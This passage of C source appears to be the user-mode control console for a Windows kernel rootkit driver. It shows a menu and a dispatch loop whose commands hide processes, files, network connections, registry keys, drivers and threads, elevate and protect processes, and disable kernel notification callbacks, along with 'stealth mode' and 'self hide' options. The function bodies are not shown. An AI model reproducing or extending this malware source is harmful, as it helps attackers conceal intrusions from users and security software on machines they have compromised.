    printf("  [25] disable registry callback\n");
    printf("  [26] enable process notify\n");
    printf("  [27] disable process notify\n");
    printf("  [28] enable image load notify\n");
    printf("  [29] disable image load notify\n");
    printf("--- logs ---\n");
    printf("  [30] view process log\n");
    printf("  [31] view image load log\n");
    printf("  [32] clear process log\n");
    printf("  [33] clear image load log\n");
    printf("--- system ---\n");
    printf("  [34] status\n");
    printf("  [35] flush all lists\n");
    printf("--- combo ---\n");
    printf("  [36] quick hide (hide+protect+file)\n");
    printf("  [37] self protect\n");
    printf("  [38] self hide\n");
    printf("  [39] enable all callbacks\n");
    printf("  [40] disable all callbacks\n");
    printf("  [41] monitor process events\n");
    printf("  [42] monitor image loads\n");
    printf("  [43] list everything\n");
    printf("  [44] help\n");
    printf("  [45] hide port (quick)\n");
    printf("  [46] full pid hide+protect+elevate\n");
    printf("  [47] stealth mode\n");
    printf("  [0]  exit\n");
    printf("> ");
}

int main(void)
{
    int choice;

    print_banner();
    if (!open_driver()) {
        printf("error: cannot open driver (run as admin, load driver first)\n");
        return 1;
    }
    if (!send_ioctl(ioctl_ping, NULL, 0, NULL, 0, NULL)) {
        printf("error: driver not responding\n");
        close_driver();
        return 1;
    }
    printf("connected to driver\n");

    while (1) {
        print_menu();
        if (scanf("%d", &choice) != 1) {
            while (getchar() != '\n');
            continue;
        }
        switch (choice) {
        case 0:
            close_driver();
            printf("disconnected\n");
            return 0;
        case 1:
            cmd_add_hidden_process();
            break;
        case 2:
            cmd_remove_hidden_process();
            break;
        case 3:
            cmd_list_hidden_processes();
            break;
        case 4:
            cmd_hide_process_by_name();
            break;
        case 5:
            cmd_add_protected_process();
            break;
        case 6:
            cmd_remove_protected_process();
            break;
        case 7:
            cmd_list_protected_processes();
            break;
        case 8:
            cmd_elevate_process();
            break;
        case 9:
            cmd_add_hidden_file();
            break;
        case 10:
            cmd_remove_hidden_file();
            break;
        case 11:
            cmd_list_hidden_files();
            break;
        case 12:
            cmd_add_hidden_connection();
            break;
        case 13:
            cmd_remove_hidden_connection();
            break;
        case 14:
            cmd_list_hidden_connections();
            break;
        case 15:
            cmd_add_hidden_reg();
            break;
        case 16:
            cmd_remove_hidden_reg();
            break;
        case 17:
            cmd_list_hidden_reg();
            break;
        case 18:
            cmd_add_hidden_driver();
            break;
        case 19:
            cmd_remove_hidden_driver();
            break;
        case 20:
            cmd_list_hidden_drivers();
            break;
        case 21:
            cmd_add_hidden_thread();
            break;
        case 22:
            cmd_remove_hidden_thread();
            break;
        case 23:
            cmd_list_hidden_threads();
            break;
        case 24:
            cmd_enable_reg_callback();
            break;
        case 25:
            cmd_disable_reg_callback();
            break;
        case 26:
            cmd_enable_proc_notify();
            break;
        case 27:
            cmd_disable_proc_notify();
            break;
        case 28:
            cmd_enable_image_notify();
            break;
        case 29:
            cmd_disable_image_notify();
            break;
        case 30:
            cmd_get_proc_log();
            break;
        case 31:
            cmd_get_image_log();
            break;
        case 32:
            cmd_clear_proc_log();
            break;
        case 33:
            cmd_clear_image_log();
            break;
        case 34:
            cmd_get_status();
            break;
        case 35:
            cmd_flush_all();
            break;
        case 36:
            cmd_quick_hide();
            break;
        case 37:
            cmd_self_protect();
            break;
        case 38:
            cmd_self_hide();
            break;
        case 39:
            cmd_enable_all_callbacks();
            break;
        case 40:
            cmd_disable_all_callbacks();
            break;
        case 41:
            cmd_monitor_procs();
            break;
        case 42:
            cmd_monitor_images();
            break;
        case 43:
            cmd_list_all();
            break;
        case 44:
            cmd_help();
            break;
        case 45:
            cmd_hide_port();
            break;
        case 46:
            cmd_hide_pid_full();
            break;
        case 47:
            cmd_stealth_mode();
            break;
        default:
            printf("invalid (type 44 for help)\n");
            break;
        }
    }
}
